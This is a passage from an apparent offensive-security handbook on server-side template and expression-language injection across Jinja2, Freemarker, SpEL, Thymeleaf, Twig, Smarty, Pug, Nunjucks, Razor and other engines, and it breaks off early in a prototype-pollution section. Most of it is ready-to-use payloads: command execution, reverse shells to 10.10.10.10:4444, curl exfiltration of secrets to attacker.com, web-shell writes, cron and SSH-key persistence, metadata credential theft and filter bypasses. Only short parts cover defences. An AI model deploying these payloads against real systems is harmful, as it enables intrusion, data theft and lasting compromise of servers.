$rt.getRuntime().exec($cmd)
```

---

## Detection and Exploitation Automation

### tplmap

**Installation:**

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt
```

**Basic Detection:**

```bash
python tplmap.py -u 'http://target.com/page?name=test'
```

**Specifying Template Engine:**

```bash
python tplmap.py -u 'http://target.com/page?name=test' --engine Jinja2
```

**Testing POST Parameters:**

```bash
python tplmap.py -u 'http://target.com/page' -d 'name=test&param=value'
```

**OS Shell:**

```bash
python tplmap.py -u 'http://target.com/page?name=test' --os-shell
```

**File Operations:**

```bash
# Read file
python tplmap.py -u 'http://target.com/page?name=test' --file-read /etc/passwd

# Upload file
python tplmap.py -u 'http://target.com/page?name=test' --file-upload local.txt --file-dest /tmp/remote.txt
```

### Manual Detection with Burp Suite

**Intruder Payloads for Detection:**

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
@(7*7)
{7*7}
```

**Collaborator Integration:**

```jinja2
# Jinja2/Python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('nslookup BURP_COLLABORATOR',shell=True) }}

# Freemarker
<#assign value=object?api.class.forName("java.lang.Runtime").getRuntime().exec("nslookup BURP_COLLABORATOR")>

# Velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
$rt.getRuntime().exec('nslookup BURP_COLLABORATOR')
```

### Custom Python Detection Script

```python
import requests
import re

payloads = {
    'jinja2': '{{7*7}}',
    'mako': '${ 7*7 }',
    'freemarker': '${7*7}',
    'velocity': '#set($x=7*7)$x',
    'erb': '<%= 7*7 %>',
    'smarty': '{7*7}'
}

expected = {
    'jinja2': '49',
    'mako': '49',
    'freemarker': '49',
    'velocity': '49',
    'erb': '49',
    'smarty': '49'
}

def test_ssti(url, param):
    for engine, payload in payloads.items():
        try:
            r = requests.get(url, params={param: payload}, timeout=5)
            if expected[engine] in r.text:
                print(f"[+] Potential {engine.upper()} SSTI detected!")
                print(f"[+] Payload: {payload}")
                print(f"[+] Response snippet: {r.text[:200]}")
                return engine
        except Exception as e:
            print(f"[-] Error testing {engine}: {e}")
    return None

# Usage
url = "http://target.com/page"
param = "name"
detected = test_ssti(url, param)
```

---

## Advanced Exploitation Techniques

### Blind SSTI Detection

**Time-Based Detection:**

**Jinja2:**

```jinja2
{% for i in range(10000000) %}{% endfor %}
```

**Freemarker:**

```freemarker
<#list 1..10000000 as i></#list>
```

**Velocity:**

```velocity
#foreach($i in [1..10000000])#end
```

**ERB:**

```erb
<% (1..10000000).each do |i| end %>
```

**DNS/HTTP Exfiltration for Blind SSTI:**

**Jinja2:**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[396]('curl http://attacker.com/?data='+config['SECRET_KEY'], shell=True) }}
```

**Freemarker:**

```freemarker
<#assign runtime="freemarker.template.utility.Execute"?new()>
${runtime("curl http://attacker.com/?data=exfil")}
```

### Chaining SSTI with Other Vulnerabilities

**SSTI → SQL Injection:**

```jinja2
{{ config['SQLALCHEMY_DATABASE_URI'] }}
# Extract DB credentials, then exploit SQLi
```

**SSTI → File Upload:**

```jinja2
{{ self.__init__.__globals__.__builtins__.open('/var/www/html/shell.php','w').write('<?php system($_GET["c"]); ?>') }}
```

**SSTI → SSRF:**

```jinja2
{{ lipsum.__globals__.__builtins__.__import__('urllib.request').urlopen('http://169.254.169.254/latest/meta-data/').read() }}
```

### Filter Bypass Techniques Summary

**Character Encoding:**

```python
# URL encoding
%7B%7B7*7%7D%7D

# Unicode encoding
\u007b\u007b7*7\u007d\u007d

# HTML entity encoding
&#123;&#123;7*7&#125;&#125;
```

**String Concatenation:**

```jinja2
{{ ''['__cla'+'ss__'] }}
{{ ''|attr('__cla'+'ss__') }}
```

**Request Parameter Smuggling:**

```jinja2
{{ ''|attr(request.args.x) }}
# URL: ?x=__class__
```

**Comment Abuse:**

```jinja2
{{''.__cla{#comment#}ss__}}
```

---

## Platform-Specific Considerations

### Flask/Django (Python - Jinja2)

**Accessing Framework Objects:**

```jinja2
{{ config }}                    # Flask config
{{ request }}                   # Current request
{{ session }}                   # Session data
{{ g }}                         # Flask 'g' object
```

**Common Sensitive Data:**

```jinja2
{{ config['SECRET_KEY'] }}
{{ config['SQLALCHEMY_DATABASE_URI'] }}
{{ session }}
```

### Ruby on Rails (ERB)

**Rails-Specific Objects:**

```erb
<%= Rails.env %>
<%= Rails.root %>
<%= Rails.application.secrets %>
<%= ActiveRecord::Base.connection_config %>
```

### Spring Framework (Freemarker/Velocity)

**Spring Context Access:**

```freemarker
${springMacroRequestContext}
${RequestContext}
```

**Application Properties ([Inference] - if exposed):**

```velocity
$applicationProperties
```

---

## Defense Mechanisms and Bypass

### Common Protections

**[Inference]** Applications may implement:

1. **Input validation** - Reject template syntax characters
2. **Sandboxing** - Restrict available classes/methods
3. **Logic-less templates** - Use Mustache/Handlebars
4. **Separate template compilation** - Precompile templates

### Bypass Strategies

**Encoding-Based Bypass:**

- Use alternative syntax (`attr()` instead of direct access)
- Leverage request parameters to smuggle payloads
- Chain multiple template features

**Context-Based Bypass:**

- Exploit template inheritance
- Abuse macros and includes
- Leverage custom filters/functions

---

## Important Caveats

**[Unverified]** Template engine versions significantly affect exploitation:

- Newer Jinja2 versions restrict `__builtins__` access
- Freemarker 2.3.30+ restricts dangerous classes by default
- Velocity may not expose ClassTool in modern configurations

**[Inference]** Success depends on:

- Template engine version and configuration
- Available Python/Ruby/Java classes
- Application sandbox restrictions
- Server-side filtering mechanisms

**Testing Restrictions:**

- **Never test on production without authorization**
- SSTI can cause server crashes or data loss
- Command execution affects entire server
- File operations may corrupt application data

**Related advanced topics:**

- Client-Side Template Injection (CSTI)
- Expression Language (EL)

## Expression Language (EL) Injection

Expression Language is used in Java environments (JSP, JSF, Spring) and can be exploited similarly to template injection.

### Unified EL (Java EE)

**Basic EL Syntax:**

```jsp
${expression}           # Immediate evaluation
#{expression}           # Deferred evaluation (JSF)
```

**Detection Payloads:**

```jsp
${7*7}                  # Returns 49
${'test'.toUpperCase()} # Returns TEST
${7*'7'}                # Returns 7777777
```

### EL RCE Exploitation

**Accessing Runtime via Reflection:**

```jsp
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')}
```

**Using ProcessBuilder:**

```jsp
${''.getClass().forName('java.lang.ProcessBuilder').newInstance(['whoami'] as String[]).start()}
```

**Alternative Syntax:**

```jsp
${pageContext.request.getSession().getServletContext().getClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
```

### Spring EL (SpEL) Exploitation

**Spring Expression Language Syntax:**

```java
#{expression}
```

**Basic Detection:**

```java
#{7*7}                              # 49
#{T(java.lang.System).getProperty('user.name')}
```

**RCE via Runtime:**

```java
#{T(java.lang.Runtime).getRuntime().exec('whoami')}
```

**Using ProcessBuilder:**

```java
#{new java.lang.ProcessBuilder({'bash','-c','whoami'}).start()}
```

**Accessing Spring Beans:**

```java
#{@beanName}                        # Access Spring bean
#{@environment.getProperty('SECRET_KEY')}
```

### Advanced SpEL Techniques

**Reflection-Based Execution:**

```java
#{T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())}
```

**Reading Files:**

```java
#{T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd'))}
```

**DNS Exfiltration:**

```java
#{T(java.net.InetAddress).getByName('exfil.attacker.com')}
```

### SpEL in Spring Boot Applications

**Accessing Application Context:**

```java
#{@applicationContext}
#{@applicationContext.getBean('dataSource')}
```

**Environment Variables:**

```java
#{systemProperties['user.home']}
#{systemEnvironment['PATH']}
```

**Configuration Properties:**

```java
#{@environment.getProperty('spring.datasource.url')}
#{@environment.getProperty('spring.datasource.password')}
```

---

## Thymeleaf Template Injection

Thymeleaf is a modern Java template engine commonly used with Spring Boot.

### Basic Thymeleaf Syntax

**Variable Expressions:**

```html
<span th:text="${variable}">default</span>
```

**Selection Expressions:**

```html
<div th:object="${user}">
  <span th:text="*{name}">Name</span>
</div>
```

### Thymeleaf SSTI Detection

**Detection Payloads:**

```html
[[${7*7}]]              # Inline expression - returns 49
[(${7*7})]              # Inline expression alternative
__${7*7}__              # Preprocessed expression
```

### Thymeleaf RCE Exploitation

**Using Expression Preprocessing:**

```html
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).next()}__
```

**Alternative with ProcessBuilder:**

```html
__${T(java.lang.Runtime).getRuntime().exec('id')}__
```

**Fragment Expression Exploitation ([Inference] - version specific):**

```html
~{__${T(java.lang.Runtime).getRuntime().exec('whoami')}__}
```

### Thymeleaf 3.x Exploitation

**[Inference]** Thymeleaf 3.x introduced SpringEL integration, which can be exploited:

```html
${T(java.lang.Runtime).getRuntime().exec('whoami')}
```

**URL Expression Exploitation:**

```html
<img th:src="@{__${T(java.lang.Runtime).getRuntime().exec('whoami')}__}">
```

**JavaScript Inline Exploitation:**

```html
<script th:inline="javascript">
var x = [[${T(java.lang.Runtime).getRuntime().exec('id')}]];
</script>
```

---

## Smarty Template Injection (PHP)

Smarty is a popular PHP template engine.

### Basic Smarty Syntax

**Variable Display:**

```smarty
{$variable}
{$array.key}
{$object->property}
```

**Math Operations:**

```smarty
{7*7}                   # Returns 49
{$x+$y}
```

### Smarty RCE Exploitation

**Using {php} Tags (Smarty 2.x):**

```smarty
{php}echo system('whoami');{/php}
```

**[Inference]** Smarty 3.x removed {php} tags by default for security.

**Static Class Access (Smarty 3.x):**

```smarty
{system('whoami')}
```

**Self Variable Exploitation:**

```smarty
{self::getStreamVariable("file:///etc/passwd")}
```

**Using Smarty Internal Functions:**

```smarty
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php eval($_GET['c']); ?>",self::clearConfig())}
```

### Advanced Smarty Exploitation

**File Write via Smarty:**

```smarty
{Smarty_Internal_Write_File::writeFile('/var/www/html/shell.php','<?php system($_GET["cmd"]); ?>',self::clearConfig())}
```

**Fetching Remote Files:**

```smarty
{fetch file="http://attacker.com/shell.txt"}
```

**Static Method Invocation:**

```smarty
{self::getStreamVariable("php://filter/convert.base64-encode/resource=/etc/passwd")}
```

### Smarty Security Mode Bypass

**[Inference]** Smarty's security mode restricts dangerous functions, but can sometimes be bypassed.

**Attempting Bypass:**

```smarty
{if system('whoami')}{/if}
{$x=system('id')}{$x}
```

---

## Twig Template Injection (PHP)

Twig is the default template engine for Symfony framework.

### Basic Twig Syntax

**Variable Output:**

```twig
{{ variable }}
{{ 7*7 }}               # Returns 49
```

**Control Structures:**

```twig
{% if condition %}
{% for item in items %}
{% set x = value %}
```

### Twig SSTI Detection

**Detection Payloads:**

```twig
{{7*7}}                 # Returns 49
{{7*'7'}}               # Returns 49 (not 7777777 like Jinja2)
{{"test"|upper}}        # Returns TEST
```

### Twig RCE Exploitation

**Using _self Environment:**

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Alternative Chain:**

```twig
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
```

**Using getFilter Method:**

```twig
{{['id']|filter('system')}}
```

### Advanced Twig Exploitation Techniques

**Accessing PHP Functions via map Filter:**

```twig
{{['id']|map('system')|join}}
```

**Using reduce Filter:**

```twig
{{['id',0]|reduce('system')}}
```

**Filter Chain for File Operations:**

```twig
{{'/etc/passwd'|file_get_contents}}
```

**Object Injection via unserialize ([Unverified] - requires specific conditions):**

```twig
{{app.request.query.get('data')|unserialize}}
```

### Twig Sandbox Bypass

**[Inference]** Twig sandbox restricts access to dangerous functions and objects.

**Bypass Attempts:**

**Via Arrow Function (Twig 3.x):**

```twig
{{(x=>x.getRuntime())(_self.env)}}
```

**Using sort Filter with Callback:**

```twig
{{"id"|sort(0,"system")}}
```

**Exploiting Custom Filters:**

```twig
{{app|get_class}}
{{app.request.server.all}}
```

---

## Pug/Jade Template Injection (Node.js)

Pug (formerly Jade) is a template engine for Node.js.

### Basic Pug Syntax

**Variable Interpolation:**

```pug
p= username
p #{username}
p !{unsafeContent}
```

### Pug SSTI Detection

**Detection Payloads:**

```pug
#{7*7}                  # Returns 49
- var x = 7*7
p= x                    # Returns 49
```

### Pug RCE Exploitation

**Using Unbuffered Code:**

```pug
- var x = require('child_process').execSync('whoami').toString()
p= x
```

**Direct Execution:**

```pug
- require('child_process').execSync('whoami').toString()
```

**Using global.process:**

```pug
- global.process.mainModule.require('child_process').execSync('id')
```

### Advanced Pug Exploitation

**Reverse Shell:**

```pug
- var net = require('net');
- var spawn = require('child_process').spawn;
- var sh = spawn('/bin/sh', []);
- var client = new net.Socket();
- client.connect(4444, '10.10.10.10', function(){
-   client.pipe(sh.stdin);
-   sh.stdout.pipe(client);
-   sh.stderr.pipe(client);
- });
```

**File Operations:**

```pug
- var fs = require('fs')
- var data = fs.readFileSync('/etc/passwd', 'utf8')
p= data
```

---

## Handlebars Template Injection (Node.js)

Handlebars is a logic-less template engine for JavaScript.

### Basic Handlebars Syntax

**Variable Output:**

```handlebars
{{variable}}
{{{unsafeVariable}}}    # Unescaped
```

### Handlebars SSTI Detection

**Detection is Challenging ([Inference] - Handlebars is "logic-less"):**

```handlebars
{{constructor}}         # May show [object Object]
{{this}}                # Shows context
```

### Handlebars RCE Exploitation via Helpers

**[Inference]** Handlebars RCE typically requires custom helpers or prototype pollution.

**Prototype Pollution to RCE:**

```javascript
// If prototype pollution exists:
constructor[prototype][helper] = function(){
  return require('child_process').execSync('whoami').toString();
}
```

**Exploiting Custom Helpers:**

```handlebars
{{#with "constructor"}}
  {{#with "prototype"}}
    {{#with "toString"}}
      {{lookup . "call"}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Advanced Chain ([Unverified] - highly context-dependent):**

```handlebars
{{#with "constructor" as |c|}}
  {{#with c as |cc|}}
    {{lookup cc "call"}}
  {{/with}}
{{/with}}
```

---

## Nunjucks Template Injection (Node.js)

Nunjucks is a JavaScript template engine inspired by Jinja2.

### Basic Nunjucks Syntax

**Variable Output:**

```nunjucks
{{ variable }}
{{ 7*7 }}               # Returns 49
```

### Nunjucks SSTI Detection

**Detection Payloads:**

```nunjucks
{{7*7}}                 # Returns 49
{{7*'7'}}               # Returns 7777777
```

### Nunjucks RCE Exploitation

**Using range and Constructor:**

```nunjucks
{{range.constructor("return global.process.mainModule.require('child_process').execSync('whoami')")()}}
```

**Alternative Approach:**

```nunjucks
{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}
```

**Using String Constructor:**

```nunjucks
{{"a".constructor.prototype.charAt=[].join}}
{{{"test":1}|dump|replace("test","__import__('os').system('id')")|safe}}
```

### Advanced Nunjucks Exploitation

**Accessing Global Objects:**

```nunjucks
{{global.process.mainModule.require('child_process').execSync('whoami').toString()}}
```

**File Operations:**

```nunjucks
{{range.constructor("return global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')")()}}
```

---

## Tornado Template Injection (Python)

Tornado is a Python web framework with its own template engine.

### Basic Tornado Syntax

**Variable Output:**

```tornado
{{ variable }}
{{ 7*7 }}               # Returns 49
```

**Python Expressions:**

```tornado
{% import os %}
{{ os.system('whoami') }}
```

### Tornado RCE Exploitation

**Direct Import and Execution:**

```tornado
{% import os %}
{{ os.popen('id').read() }}
```

**Using subprocess:**

```tornado
{% import subprocess %}
{{ subprocess.check_output(['whoami']) }}
```

**Multi-line Code Blocks:**

```tornado
{% import socket,subprocess,os %}
{% s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) %}
{% s.connect(("10.10.10.10",4444)) %}
{% os.dup2(s.fileno(),0) %}
{% os.dup2(s.fileno(),1) %}
{% os.dup2(s.fileno(),2) %}
{% p=subprocess.call(["/bin/sh","-i"]) %}
```

---

## Razor Template Injection (.NET)

Razor is the template engine for ASP.NET MVC and Razor Pages.

### Basic Razor Syntax

**Variable Output:**

```razor
@variable
@(7*7)                  # Returns 49
```

**Code Blocks:**

```razor
@{
    var x = 7 * 7;
}
@x
```

### Razor SSTI Detection

**Detection Payloads:**

```razor
@(7*7)                  # Returns 49
@DateTime.Now           # Returns current datetime
```

### Razor RCE Exploitation

**Using System.Diagnostics.Process:**

```razor
@{
    var startInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c whoami");
    startInfo.RedirectStandardOutput = true;
    startInfo.UseShellExecute = false;
    var process = System.Diagnostics.Process.Start(startInfo);
    var output = process.StandardOutput.ReadToEnd();
}
@output
```

**Simplified Version:**

```razor
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
```

**PowerShell Execution:**

```razor
@{
    var psi = new System.Diagnostics.ProcessStartInfo();
    psi.FileName = "powershell.exe";
    psi.Arguments = "-c whoami";
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    var proc = System.Diagnostics.Process.Start(psi);
    var output = proc.StandardOutput.ReadToEnd();
}
@output
```

### Advanced Razor Exploitation

**File Operations:**

```razor
@System.IO.File.ReadAllText("C:\\Windows\\System32\\drivers\\etc\\hosts")
```

**Writing Web Shell:**

```razor
@System.IO.File.WriteAllText("C:\\inetpub\\wwwroot\\shell.aspx", "<%@ Page Language=\"C#\" %><%Response.Write(System.Diagnostics.Process.Start(\"cmd\",\"/c \"+Request[\"c\"]).StandardOutput.ReadToEnd());%>")
```

**Reflection-Based Execution:**

```razor
@{
    var assembly = System.Reflection.Assembly.Load("System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
    var type = assembly.GetType("System.Diagnostics.Process");
    var method = type.GetMethod("Start", new Type[] { typeof(string), typeof(string) });
    var result = method.Invoke(null, new object[] { "cmd.exe", "/c whoami" });
}
```

---

## Additional Template Engines

### Mustache Template Injection

**[Inference]** Mustache is intentionally logic-less and generally resistant to SSTI.

**Limited Exploitation:**

```mustache
{{variable}}            # Only variable interpolation
{{#lambda}}...{{/lambda}}  # Requires lambda in context
```

**Possible Information Disclosure:**

```mustache
{{.}}                   # Current context
{{#.}}{{.}}{{/.}}       # Iterate context
```

### Liquid Template Injection (Ruby/Jekyll)

**Basic Liquid Syntax:**

```liquid
{{ variable }}
{{ 7 | times: 7 }}      # Returns 49
```

**Limited RCE Potential ([Inference] - Liquid is sandboxed by design):**

```liquid
{{ "cat /etc/passwd" | system }}  # Usually blocked
```

**Information Disclosure:**

```liquid
{{ site }}              # Jekyll site object
{{ page }}              # Current page data
```

### Slim Template Injection (Ruby)

**Basic Slim Syntax:**

```slim
= variable
= 7*7                   # Returns 49
```

**RCE via Ruby Code:**

```slim
= `whoami`
= %x(id)
= system('whoami')
```

**Multi-line Execution:**

```slim
ruby:
  require 'socket'
  s = TCPSocket.new("10.10.10.10", 4444)
  while cmd = s.gets
    IO.popen(cmd, "r") {|io| s.print io.read}
  end
```

---

## Exploitation Workflow and Methodology

### Step-by-Step Exploitation Process

**1. Identify Injection Point:**

```bash
# Test common reflection points
- URL parameters: ?name=test
- POST body fields: username=test
- HTTP headers: User-Agent, Referer
- File names in upload functions
- Template selection parameters
```

**2. Detect Template Engine:**

```bash
# Use polyglot payload
${{<%[%'"}}%\.

# Or targeted detection
{{7*7}}     # Jinja2/Twig/Nunjucks
${7*7}      # Freemarker/Velocity/EL
<%= 7*7 %>  # ERB
```

**3. Identify Available Objects/Functions:**

```python
# Jinja2 example
{{ self.__dict__ }}
{{ config }}
{{ request }}

# List all available
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**4. Craft Exploitation Payload:**

```python
# Based on detected engine and available objects
# Test with safe commands first (whoami, id)
# Escalate to reverse shell if needed
```

**5. Establish Persistence:**

```bash
# Write web shell
# Add SSH key
# Create backdoor user
# Schedule cron job
```

### Testing Checklist

**Injection Points to Test:**

- [ ] URL parameters (GET)
- [ ] POST body parameters
- [ ] HTTP headers (User-Agent, Referer, X-Forwarded-For)
- [ ] Cookie values
- [ ] File upload filenames
- [ ] API JSON/XML payloads
- [ ] WebSocket messages
- [ ] GraphQL queries
- [ ] Email template fields
- [ ] PDF generation inputs

**Template Engines to Test:**

- [ ] Jinja2 (Python)
- [ ] Mako (Python)
- [ ] Tornado (Python)
- [ ] Freemarker (Java)
- [ ] Velocity (Java)
- [ ] Thymeleaf (Java)
- [ ] ERB (Ruby)
- [ ] Slim (Ruby)
- [ ] Twig (PHP)
- [ ] Smarty (PHP)
- [ ] Pug/Jade (Node.js)
- [ ] Nunjucks (Node.js)
- [ ] Handlebars (Node.js)
- [ ] Razor (.NET)

---

## Mitigation Bypass Techniques

### WAF Evasion

**Encoding Variations:**

```python
# Unicode escaping
\u0027\u0027.__class__

# Hex escaping
\x27\x27.__class__

# Octal escaping
\047\047.__class__
```

**Whitespace Manipulation:**

```python
# Tab instead of space
{{''.__class__}}

# Newline injection
{{''
.__class__}}

# Multiple spaces
{{''  .__class__}}
```

**Comment Injection:**

```jinja2
{{''.__cla{# comment #}ss__}}
{{''.__class__{# #}__}}
```

**String Concatenation:**

```jinja2
{{'__cla'+'ss__'}}
{{['__','class','__']|join}}
```

### Sandbox Escape Patterns

**Jinja2 Sandbox Escape via Format:**

```jinja2
{%set x=dict(__builtins__=1).fromkeys%}{%print(x.__repr__.__globals__.__builtins__.eval("__import__('os').popen('id').read()"))%}
```

**Using lipsum/cycler Objects:**

```jinja2
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Via URL decode Functions:**

```jinja2
{{request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

---

## Real-World Exploitation Scenarios

### Scenario 1: Flask Application with User Profile

**Vulnerable Code:**

```python
@app.route('/profile/<username>')
def profile(username):
    template = f'''
    <h1>Profile: {username}</h1>
    <p>Welcome to the profile page!</p>
    '''
    return render_template_string(template)
```

**Exploitation:**

```
/profile/{{config.items()}}
/profile/{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}
```

### Scenario 2: Email Template in Java Application

**Vulnerable Code:**

```java
String template = "Dear " + userName + ", your order #" + orderId + " has been confirmed.";
Configuration cfg = new Configuration(Configuration.VERSION_2_3_29);
Template t = new Template("email", new StringReader(template), cfg);
```

**Exploitation in userName field:**

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

### Scenario 3: PDF Generation with Template

**Vulnerable Pattern:**

```ruby
# Ruby application using ERB for PDF generation
template = ERB.new("<h1>Invoice for <%= customer_name %></h1>")
pdf = WickedPdf.new.pdf_from_string(template.result(binding))
```

**Exploitation:**

```
customer_name = <%= `whoami` %>
customer_name = <%= IO.popen('cat /etc/passwd').read %>
```

---

## Post-Exploitation Activities

### Credential Extraction

**Application Secrets:**

```python
# Flask/Django
{{ config }}
{{ settings.SECRET_KEY }}

# Spring
#{@environment.getProperty('spring.datasource.password')}

# Rails
<%= Rails.application.secrets %>
```

**Database Credentials:**

```python
# SQLAlchemy (Flask)
{{ config['SQLALCHEMY_DATABASE_URI'] }}

# ActiveRecord (Rails)
<%= ActiveRecord::Base.connection_config %>

# JDBC (Java)
${dataSource.getConnection().getMetaData().getURL()}
```

### Lateral Movement

**Internal Network Scanning:**

```python
# Jinja2 - Port scan
{% for port in range(1,1000) %}
  {{''.__class__.__mro__[1].__subclasses__()[396]('nc -zv 192.168.1.1 '+port|string,shell=True)}}
{% endfor %}
```

**SSRF via SSTI:**

```python
{{''.__class__.__mro__[1].__subclasses__()[396]('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',shell=True,stdout=-1).communicate()}}
```

### Persistence Mechanisms

**Cron Job (Linux):**

```python
{{''.__class__.__mro__[1].__subclasses__()[396]("echo '* * * * * /bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\"' >> /var/spool/cron/crontabs/www-data",shell=True)}}
```

**SSH Key Injection:**

```python
{{''.__class__.__mro__[1].__subclasses__()[396]("echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys",shell=True)}}
```

**Web Shell Upload:**

```python
{{''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php system($_GET[\"c\"]); ?>')}}
```

---

## Defense Mechanisms

### Secure Coding Practices

**1. Never Use User Input Directly in Templates:**

```python
# BAD
template = f"Hello {user_input}!"
render_template_string(template)

# GOOD
render_template('hello.html', name=user_input)
```

**2. Use Logic-Less Template Engines:**

- Mustache
- Handlebars (without custom helpers)
- Pure HTML templates with safe interpolation

**3. Implement Strict Input Validation:**

```python
import re

def validate_input(user_input):
    # Only allow alphanumeric and safe characters
    if not re.match(r'^[a-zA-Z0-9_\-\s]+$', user_input):
        raise ValueError("Invalid input")
    return user_input
```

**4. Enable Sandboxing:**

```python
# Jinja2 sandbox
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string(user_template)
```

**5. Disable Dangerous Features:**

```python
# Freemarker - restrict object access
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
cfg.setAPIBuiltinEnabled(false);
```

### Detection and Monitoring

**WAF Rules for SSTI Detection:**

```
# ModSecurity rule example
SecRule ARGS "@rx (\{\{|\$\{|<%=|<\?php)" \
    "id:1000,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Potential SSTI attempt detected'"
```

**Application-Level Logging:**

```python
import logging

# Log all template rendering attempts
logging.warning(f"Template render with user input: {user_input}")
```

---

## Important Testing Considerations

**[Inference]** SSTI exploitation success factors:

- Template engine version and configuration
- Available Python/Ruby/Java/PHP modules
- Application sandbox restrictions
- File system permissions
- Network egress filtering

**[Unverified]** Modern frameworks increasingly:

- Default to sandboxed environments
- Restrict dangerous class/function access
- Separate template compilation from rendering
- Implement automatic escaping

**Testing Restrictions:**

- **Never test on production without explicit authorization**
- SSTI can cause application crashes
- Command execution affects entire server
- File operations may corrupt critical data
- Always use isolated test environments

**Related advanced topics:**

- Client-Side Template Injection (CSTI) for AngularJS/Vue.js
- Template injection in NoSQL queries
- SSTI in mobile application frameworks
- GraphQL injection leading to template exploitation
- PDF generation SSTI vectors
- Log injection to template exploitation chains

---

# Prototype Pollution

## JavaScript Prototype Chain

The JavaScript prototype chain is the mechanism by which objects inherit properties and methods from their prototypes. Understanding this chain is fundamental to exploiting prototype pollution vulnerabilities.

**Prototype fundamentals:** Every JavaScript object (except `null`) has an internal `[[Prototype]]` reference accessible via `Object.getPrototypeOf()` or the non-standard `__proto__` property. When accessing a property on an object, the JavaScript engine first checks the object itself. If the property doesn't exist, it traverses up the prototype chain, checking each object's prototype until finding the property or reaching `null`.

```javascript
// Basic prototype chain
const obj = { a: 1 };
console.log(obj.a); // 1 (found on obj)
console.log(obj.b); // undefined (not on obj or Object.prototype)

// Accessing prototype
console.log(Object.getPrototypeOf(obj) === Object.prototype); // true

// Setting property on prototype affects all objects
Object.prototype.polluted = 'value';
console.log(obj.polluted); // 'value' (inherited from Object.prototype)
```

**Constructor functions and prototypes:** Constructor functions have a `prototype` property that becomes the prototype of instances created with `new`. All instances share the same prototype object, making it a powerful pollution vector.

```javascript
function User(name) {
  this.name = name;
}

User.prototype.role = 'user';

const admin = new User('admin');
console.log(admin.role); // 'user'

// Polluting User.prototype affects all instances
User.prototype.role = 'admin';
console.log(admin.role); // 'admin'
```

**Prototype chain traversal:** When a property isn't found on the immediate object, the engine checks `Object.getPrototypeOf(obj)`, then `Object.getPrototypeOf(Object.getPrototypeOf(obj))`, and so on. This chain typically terminates at `Object.prototype`, then `null`.

```javascript
const child = Object.create({ parent: 'value' });
child.own = 'own-value';

// Traversal: child -> { parent: 'value' } -> Object.prototype -> null
console.log(child.own); // 'own-value' (found immediately)
console.log(child.parent); // 'value' (found on first prototype)
console.log(child.toString); // [Function: toString] (from Object.prototype)
```

**Property descriptor differences:** Properties can have attributes like `writable`, `enumerable`, and `configurable`. Polluting a property with `writable: false` prevents overwrites on derived objects. Properties with `enumerable: false` don't appear in `for...in` loops but still exist in the chain.

```javascript
// By default, Object.prototype properties are non-enumerable
Object.defineProperty(Object.prototype, 'polluted', {
  value: 'invisible',
  writable: true,
  enumerable: false,
  configurable: true
});

const obj = {};
console.log(obj.polluted); // 'invisible'
for (let key in obj) {
  console.log(key); // Nothing printed (non-enumerable)
}
```

**Prototype pollution entry points:** Pollution occurs when user-controlled data is assigned to object properties without sanitization. Recursive object merge functions are common vectors, as they traverse nested objects and assign values directly to prototype chain levels.

```javascript
// Vulnerable merge function
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const config = {};
// If source contains "__proto__" key, pollution occurs
merge(config, { __proto__: { polluted: true } });
console.log({}.polluted); // true (Object.prototype polluted)
```

## Prototype Pollution via GET/POST

GET and POST parameters represent primary attack surfaces for prototype pollution vulnerabilities. Query strings and request bodies often contain nested JSON or URL-encoded data that applications merge into configuration or state objects.

**URL query string exploitation:** GET parameters with dot notation or bracket notation can target nested object properties. Applications that parse and merge query parameters into state objects without sanitization are vulnerable.

```
# Basic query string pollution
GET /page?user[role]=admin HTTP/1.1

# Dot notation access
GET /page?config.debug=true HTTP/1.1

# Prototype chain targeting
GET /page?__proto__[polluted]=true HTTP/1.1

# Constructor property targeting
GET /page?constructor[prototype][polluted]=true HTTP/1.1
```

When a server-side JavaScript application receives these parameters and processes them with vulnerable code, pollution occurs:

```javascript
// Express.js vulnerable endpoint
app.get('/page', (req, res) => {
  let config = {};
  config = merge(config, req.query); // Merges query params directly
  
  // If req.query contains __proto__, Object.prototype is polluted
  res.send(`Debug: ${{}.debug}`); // Outputs polluted value
});
```

